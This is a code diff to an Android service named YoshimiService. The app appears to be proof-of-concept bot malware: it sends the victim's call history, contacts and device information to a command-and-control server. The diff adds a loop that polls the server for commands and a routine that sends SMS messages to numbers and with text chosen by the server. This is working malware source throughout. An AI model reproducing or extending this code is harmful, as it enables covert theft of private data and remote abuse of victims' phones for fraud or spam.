@@ -6,7 +6,10 @@ import java.util.List;
 
 import org.apache.http.NameValuePair;
 import org.apache.http.message.BasicNameValuePair;
+import org.json.JSONArray;
+import org.json.JSONException;
 import org.json.JSONObject;
+import org.json.JSONTokener;
 
 import com.redactedlabs.yoshimi.RecentCall;
 import com.redactedlabs.yoshimi.StealData;
@@ -16,6 +19,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.os.IBinder;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
@@ -46,7 +50,6 @@ public class YoshimiService extends Service {
 	
 	@Override
 	public IBinder onBind(Intent intent) {
-		// TODO Auto-generated method stub
 		return null;
 	}
 	
@@ -79,32 +82,51 @@ public class YoshimiService extends Service {
 	}
 	
 	private void mainLoop() throws InterruptedException {
-		Log.d(TAG, "Sending a hello ...");
+		Log.d(TAG, "Sending a hello to C&C");
 		String getResponse = Http.GET(CC_SERVER+"/bot/hello", uuid);
 		Log.d(TAG, "Yoshimi C&C (GET): " + getResponse);
 		/* Send Version and Model */
-		Log.d(TAG, "Sending version information ...");
+		Log.d(TAG, "Sending version information");
 		String postResponse = Http.POST(CC_SERVER+"/bot/version", uuid, getVersionInformation());
 		Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
 		/* Send Call History */
-		Log.d(TAG, "Sending call information ...");
+		Log.d(TAG, "Sending call information");
 		List<NameValuePair> callInfo = getCallInformation();
 		if (callInfo != null) {
 			postResponse = Http.POST(CC_SERVER+"/bot/calls", uuid, callInfo);
 			Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
 		}
 		/* Send Contacts */
-		Log.d(TAG, "Sending contacts information ...");
+		Log.d(TAG, "Sending contacts information");
 		getContactsInformation();
-
-		Log.d(TAG, "Starting main loop ...");
+		poll();
+	}
+	
+	private void poll() {
+		/* Ugly PoC - Poll server for commands */
+		Log.d(TAG, "Starting main loop");
 		while (true) {
-			/* Poll server for commands */
-			for (int index = 0; index < 30; index++) {
-				Thread.sleep(1000);
-				Log.d(TAG, "Still alive!");
+			Log.d(TAG, "Checking for commands");
+			String response = Http.GET(CC_SERVER+"/bot/ping", uuid).replaceAll("\\s","");
+			if (!response.equals("nop")) {
+				Log.d(TAG, "Received new command: " + response);
+			    try {
+			    	JSONObject command = new JSONObject(response);
+			    	if (command.get("op").toString().equals("sms")) {
+			    		sendSms(command.get("phone_number").toString(), command.get("message").toString());
+			    		Http.GET(CC_SERVER+"/bot/completed", uuid);
+			    	}
+				} catch (JSONException error) {
+					Log.e(TAG, "Unable to decode json message: " + error.toString());
+				}
+			} else {
+				Log.d(TAG, "C&C responded with a nop, sleeping ...");
 			}
-			Http.GET(CC_SERVER+"/bot/ping", uuid);
+			try {
+				Thread.sleep(5000);
+			} catch (Exception error) {
+				Log.e(TAG, "Error while sleeping:" + error.toString());
+			}
 		}
 	}
 	
@@ -165,5 +187,11 @@ public class YoshimiService extends Service {
 		} else {
 			Log.d(TAG, "No contacts found");
 		}
+	}
+	
+	private void sendSms(String phoneNumber, String message) {
+		Log.d(TAG, "Sending sms message to: " + phoneNumber);
+		SmsManager smsManager = SmsManager.getDefault();
+		smsManager.sendTextMessage(phoneNumber, null, message, null, null);
 	}
 }
